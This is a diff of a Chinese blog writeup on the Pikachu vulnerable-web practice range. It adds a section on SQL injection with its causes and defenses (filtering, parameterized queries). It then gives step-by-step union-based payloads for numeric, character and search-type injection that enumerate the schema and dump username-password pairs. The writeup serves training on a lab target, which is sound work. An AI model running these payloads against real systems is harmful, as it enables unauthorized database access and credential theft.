@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://justloseit.top/img/index/Pikachu%20%E9%9D%B6%E5%9C%BA%20Writeup.jpg">
 <meta property="article:published_time" content="2021-11-29T10:19:04.000Z">
-<meta property="article:modified_time" content="2022-02-05T13:59:29.508Z">
+<meta property="article:modified_time" content="2022-02-05T15:45:20.006Z">
 <meta property="article:author" content="Joker">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Pikachu">
@@ -222,7 +222,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      4.7k 字
+      7.4k 字
     </span>
   
 
@@ -231,7 +231,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      40 分钟
+      63 分钟
     </span>
   
 
@@ -497,6 +497,44 @@
 <ul>
 <li>因此无法进行 CSRF 攻击。<strong>使用 token 是一个防御 CSRF 攻击的方法。</strong></li>
 </ul>
+<h2 id="sql-inject"><a class="markdownIt-Anchor" href="#sql-inject"></a> SQL-Inject</h2>
+<ul>
+<li>
+<p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行，从而导致数据库受损。</p>
+</li>
+<li>
+<p>防御方法：</p>
+<ol>
+<li>对传进SQL语句里面的变量进行过滤，不允许危险字符传入；</li>
+<li>使用参数化（Parameterized Query/Parameterized Statement）；</li>
+<li>目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了“<strong>拼接</strong>”的方式,所以使用时需要慎重!</li>
+</ol>
+</li>
+</ul>
+<h3 id="数字型注入post"><a class="markdownIt-Anchor" href="#数字型注入post"></a> 数字型注入（post）</h3>
+<ul>
+<li>BurpSuite 抓包，在 Repeater 中修改 id，查看响应结果。</li>
+<li>payload：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql"># 判断注入类型。【说明是数字型】<br>id&#x3D;1 and 1 &#x3D; 1<br>id&#x3D;1 and 1 &#x3D; 2<br><br># 确定字段（列）数。【后者报错，说明字段（列）数为 2】<br>id&#x3D;1 order by 2 <br>id&#x3D;1 order by 3 <br><br># 联合查询查看显示位。【有两个显示位】<br>id&#x3D;0 union select 1,2 <br><br># 爆库名。【得到库名 pikachu。前者是所有库名，后者是查询当前所使用的数据库】<br>id&#x3D;0 union select 1,group_concat(schema_name) from information_schema.schemata<br>## 或者<br>id&#x3D;0 union select 1,database()<br><br># 爆表名。【得到表名 ...users...】<br>id&#x3D;0 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() <br><br># 爆列名。【得到列名 ...username,password...】<br>id&#x3D;0 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; <br><br># 爆值。【得到用户名-密码对】<br>id&#x3D;0 union select 1,group_concat(username,&#39;-&#39;,password) from users<br></code></pre></div></td></tr></table></figure>
+<h3 id="字符型注入get"><a class="markdownIt-Anchor" href="#字符型注入get"></a> 字符型注入（get）</h3>
+<ul>
+<li>payload：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql"># 判断注入类型。【说明是字符型】<br>id&#x3D;1&#39; or 1&#x3D;1#<br>id&#x3D;1&#39; or 1&#x3D;2#<br><br># 确定字段（列）数。【后者报错，说明字段（列）数为 2】<br>id&#x3D;1&#39; order by 2#<br>id&#x3D;1&#39; order by 3# <br><br># 联合查询查看显示位。【有两个显示位】<br>id&#x3D;0&#39; union select 1,2# <br><br># 爆库名。【得到库名 pikachu。前者是所有库名，后者是查询当前所使用的数据库】<br>id&#x3D;0&#39; union select 1,group_concat(schema_name) from information_schema.schemata#<br>## 或者<br>id&#x3D;0&#39; union select 1,database()#<br><br># 爆表名。【得到表名 ...users...】<br>id&#x3D;0&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()# <br><br># 爆列名。【得到列名 ...username,password...】<br>id&#x3D;0&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;#<br><br># 爆值。【得到用户名-密码对】<br>id&#x3D;0&#39; union select 1,group_concat(username,&#39;-&#39;,password) from users#<br></code></pre></div></td></tr></table></figure>
+<h3 id="搜索型注入"><a class="markdownIt-Anchor" href="#搜索型注入"></a> 搜索型注入</h3>
+<ul>
+<li>使用上面的字符型注入方法也可实现注入，不过既然是新题，就考虑新的绕过方式。本题使用的查询语句为：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">select username,id,email from member where username like &#39;%$name%&#39;<br></code></pre></div></td></tr></table></figure>
+<ul>
+<li>所以 payload 为：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql"># 确定字段（列）数。【后者报错，说明字段（列）数为 3】<br>id&#x3D;1%&#39; order by 3#<br>id&#x3D;1%&#39; order by 4# <br><br># 联合查询查看显示位。【有三个显示位】<br>id&#x3D;0%&#39; union select 1,2,3# <br><br># 爆库名。【得到库名 pikachu。前者是所有库名，后者是查询当前所使用的数据库】<br>id&#x3D;0%&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata#<br>## 或者<br>id&#x3D;0%&#39; union select 1,2,database()#<br><br># 爆表名。【得到表名 ...users...】<br>id&#x3D;0%&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()# <br><br># 爆列名。【得到列名 ...username,password...】<br>id&#x3D;0%&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;#<br><br># 爆值。【得到用户名-密码对】<br>id&#x3D;0%&#39; union select 1,2,group_concat(username,&#39;-&#39;,password) from users#<br></code></pre></div></td></tr></table></figure>
+<div class="note note-success">
+            <p>输入 id = %%，能够查询表中非 NULL 的值。这是因为 <code>like '%%'</code>默认为查询所有。(即 % 为通配符)</p>
+          </div>
+<h3 id="xx型注入"><a class="markdownIt-Anchor" href="#xx型注入"></a> xx型注入</h3>
 
             </div>
             <hr>
